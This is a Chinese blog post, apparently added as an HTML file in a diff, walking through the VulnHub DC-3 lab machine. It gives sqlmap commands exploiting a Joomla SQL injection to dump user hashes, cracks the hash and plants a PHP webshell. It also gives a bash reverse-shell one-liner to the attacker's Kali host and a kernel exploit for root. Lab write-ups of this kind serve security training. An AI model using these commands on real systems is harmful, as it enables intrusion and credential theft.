@@ -1,0 +1,309 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DC-3靶机渗透测试 | 榴莲酥的碎碎念</title>
+<link rel="shortcut icon" href="https://dengdinshan.github.io/favicon.ico?v=1730519803442">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://dengdinshan.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DC-3靶机渗透测试 | 榴莲酥的碎碎念 - Atom Feed" href="https://dengdinshan.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="DC-3靶机渗透测试
+环境搭建
+下载地址 https://www.vulnhub.com/entry/dc-32,312/
+
+下载得到压缩包 解压放入virtualbox里
+设置好网络
+
+开始运行
+
+设置Vmware的网络为桥接模式
+
+将攻..." />
+    <meta name="keywords" content="靶场" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://dengdinshan.github.io">
+  <img class="avatar" src="https://dengdinshan.github.io/images/avatar.png?v=1730519803442" alt="">
+  </a>
+  <h1 class="site-title">
+    榴莲酥的碎碎念
+  </h1>
+  <p class="site-description">
+    天下有情人终成眷属
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DC-3靶机渗透测试
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-08-23
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://dengdinshan.github.io/tag/ne0Z-hhZT/" class="post-tag">
+                  # 靶场
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>DC-3靶机渗透测试</p>
+<p>环境搭建</p>
+<p>下载地址 https://www.vulnhub.com/entry/dc-32,312/</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518449.jpg" alt="img" loading="lazy"></figure>
+<p>下载得到压缩包 解压放入virtualbox里</p>
+<p>设置好网络</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518452.jpg" alt="img" loading="lazy"></figure>
+<p>开始运行</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518459.jpg" alt="img" loading="lazy"></figure>
+<p>设置Vmware的网络为桥接模式</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518461.jpg" alt="img" loading="lazy"></figure>
+<p>将攻击机kali的网络设置为桥接模式</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518454.jpg" alt="img" loading="lazy"></figure>
+<p>环境已搭建好 接下来进行对于DC-3靶机的渗透测试</p>
+<p>渗透测试</p>
+<p>攻击机 kali  ip  192.168.56.102</p>
+<p>靶机 DC-3   ip  192.168.56.105</p>
+<p>信息收集</p>
+<p>首先扫描同网段下的主机 使用的工具为nmap和arp-scan</p>
+<p>arp-scan -l</p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518468.jpg" alt="img" loading="lazy"></figure>
+<p>namp -sn 192.168.56.0/24</p>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518841.jpg" alt="img" loading="lazy"></figure>
+<p>发现靶机ip是192.168.56.105</p>
+<p>接下来我们来查看其开放的端口</p>
+<p>nmap -p-192.168.56.105 -sV</p>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518865.jpg" alt="img" loading="lazy"></figure>
+<p>发现开放80端口  使用的apache搭建的http服务 在浏览器进行访问</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518888.jpg" alt="img" loading="lazy"></figure>
+<p>翻译一下是这样</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518911.jpg" alt="img" loading="lazy"></figure>
+<p>这里对网站进行目录扫描 使用dirsearch工具</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518938.jpg" alt="img" loading="lazy"></figure>
+<p>进入扫描出的后台网站</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518964.jpg" alt="img" loading="lazy"></figure>
+<p>发现一个没有用的robot文件</p>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518269.jpg" alt="img" loading="lazy"></figure>
+<p>对网站进行指纹识别</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518293.jpg" alt="img" loading="lazy"></figure>
+<p>发现网站是通过joomla框架进行搭建的</p>
+<p>这个时候我们需要用到joomla框架的扫描工具 joomscan</p>
+<p>先进行安装 apt-get install joomscan</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518318.jpg" alt="img" loading="lazy"></figure>
+<p>使用joomscan来扫描DC-3</p>
+<figure data-type="image" tabindex="16"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518343.jpg" alt="img" loading="lazy"></figure>
+<p>通过扫描我们知道了这个网站使用框架的版本号，我们可以去找相对应的漏洞了。</p>
+<p>这里我们可以利用一个漏洞检索工具searchsploit他可以帮我们检索漏洞库</p>
+<figure data-type="image" tabindex="17"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518368.jpg" alt="img" loading="lazy"></figure>
+<p>发现该版本存在sql注入</p>
+<p>这里我们去查看一下这个漏洞的说明</p>
+<p>通过查阅资料发现可以在42033.txt文件查看</p>
+<figure data-type="image" tabindex="18"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518391.jpg" alt="img" loading="lazy"></figure>
+<p>也可以通过命令</p>
+<p>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</p>
+<p>进行查看</p>
+<figure data-type="image" tabindex="19"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518820.jpg" alt="img" loading="lazy"></figure>
+<p>这里给我们罗列了很多信息，比如漏洞的序列号CVE-2017-8917</p>
+<p>利用方法，exp等等。</p>
+<p>他说这里存在逻辑注入，报错注入和延时注入3个，我们可以自己利用sqlmap去跑一下</p>
+<p>文档中列出了使用sqlmap注入的参数</p>
+<p>sqlmap -u &quot;http://192.168.56.105/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</p>
+<figure data-type="image" tabindex="20"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518841.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518870.jpg" alt="img" loading="lazy"></figure>
+<p>查看joomladb的表</p>
+<p>爆表：</p>
+<p>sqlmap -u &quot;http://192.168.56.105/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] --batch</p>
+<figure data-type="image" tabindex="22"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518892.jpg" alt="img" loading="lazy"></figure>
+<p>可以得到的数据非常多，我们可以挑有用的数据看，这里我对#__users 这个表感兴趣</p>
+<p>爆列名：</p>
+<p>sqlmap -u &quot;http://192.168.56.105/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns  -p list[fullordering]</p>
+<figure data-type="image" tabindex="23"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518922.jpg" alt="img" loading="lazy"></figure>
+<p>看到了username和password</p>
+<p>爆字段：</p>
+<p>sqlmap -u &quot;http://192.168.56.105/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C 'username,password'  -p list[fullordering] --dump --batch</p>
+<p>得到</p>
+<figure data-type="image" tabindex="24"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518950.jpg" alt="img" loading="lazy"></figure>
+<p>将密码拿到md5网站进行解密</p>
+<p>发现要付费</p>
+<figure data-type="image" tabindex="25"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518251.jpg" alt="img" loading="lazy"></figure>
+<p>那使用kali上的john工具进行解密</p>
+<p>在home/kali中创建一个1.txt文件</p>
+<p>将密文放入</p>
+<figure data-type="image" tabindex="26"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518279.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518302.jpg" alt="img" loading="lazy"></figure>
+<p>使用john工具进行爆破</p>
+<figure data-type="image" tabindex="28"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518329.jpg" alt="img" loading="lazy"></figure>
+<p>获得密码snoopy</p>
+<p>登录刚刚的administrator的后台</p>
+<figure data-type="image" tabindex="29"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518352.jpg" alt="img" loading="lazy"></figure>
+<p>逛了一下后台，我们发现在这里能新建文件并且执行php</p>
+<figure data-type="image" tabindex="30"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518369.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="31"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518521.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518630.jpg" alt="img" loading="lazy"></figure>
+<p>可以选择创建的类型，那么我们就可以创建一句话木马</p>
+<figure data-type="image" tabindex="33"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518652.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="34"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518673.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518726.jpg" alt="img" loading="lazy"></figure>
+<p>路径为http://192.168.56.105/templates/beez3/1.php</p>
+<figure data-type="image" tabindex="36"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518746.jpg" alt="img" loading="lazy"></figure>
+<p>连接成功</p>
+<figure data-type="image" tabindex="37"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518772.jpg" alt="img" loading="lazy"></figure>
+<p>连接终端查看一下信息</p>
+<figure data-type="image" tabindex="38"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518978.jpg" alt="img" loading="lazy"></figure>
+<p>不是管理员用户，尝试提权</p>
+<p>查看一下系统的内核，内核为Ubuntu 16.04</p>
+<figure data-type="image" tabindex="39"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518998.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518049.jpg" alt="img" loading="lazy"></figure>
+<p>使用kali的漏洞库搜索一下</p>
+<p>searchsploit Ubuntu 16.04</p>
+<figure data-type="image" tabindex="41"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518073.jpg" alt="img" loading="lazy"></figure>
+<p>使用39772那个</p>
+<p>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</p>
+<figure data-type="image" tabindex="42"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518098.jpg" alt="img" loading="lazy"></figure>
+<p>https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</p>
+<p>将文件下载下来</p>
+<p>使用蚁剑上传到靶机的html目录下</p>
+<p><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518121.jpg" alt="img" loading="lazy">在kali进行监听</p>
+<p>nc -lvp 1234</p>
+<figure data-type="image" tabindex="43"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518210.jpg" alt="img" loading="lazy"></figure>
+<p>在蚁剑上执行</p>
+<p>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.102/1234 0&gt;&amp;1'</p>
+<figure data-type="image" tabindex="44"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518229.jpg" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="45"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518374.jpg" alt="img" loading="lazy"></figure>
+<p>去到刚刚蚁剑上传的路径</p>
+<p>将exploit.tar文件解压</p>
+<figure data-type="image" tabindex="46"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518416.jpg" alt="img" loading="lazy"></figure>
+<p>进入到ebpf_mapfd_doubleput_exploit/</p>
+<p>cd ebpf_mapfd_doubleput_exploit/</p>
+<figure data-type="image" tabindex="47"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518466.jpg" alt="img" loading="lazy"></figure>
+<p>执行 ./compile.sh</p>
+<figure data-type="image" tabindex="48"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518518.jpg" alt="img" loading="lazy"></figure>
+<p>执行完后，会多出一个文件doubleput</p>
+<p>执行 ./doubleput</p>
+<figure data-type="image" tabindex="49"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518542.jpg" alt="img" loading="lazy"></figure>
+<p>查看当前用户</p>
+<figure data-type="image" tabindex="50"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518564.jpg" alt="img" loading="lazy"></figure>
+<p>拿到root权限</p>
+<p>在root目录下找到flag</p>
+<figure data-type="image" tabindex="51"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202408231518849.jpg" alt="img" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  总访客人数量3496次 本站总访问量7215次
+  <a class="rss" href="https://dengdinshan.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
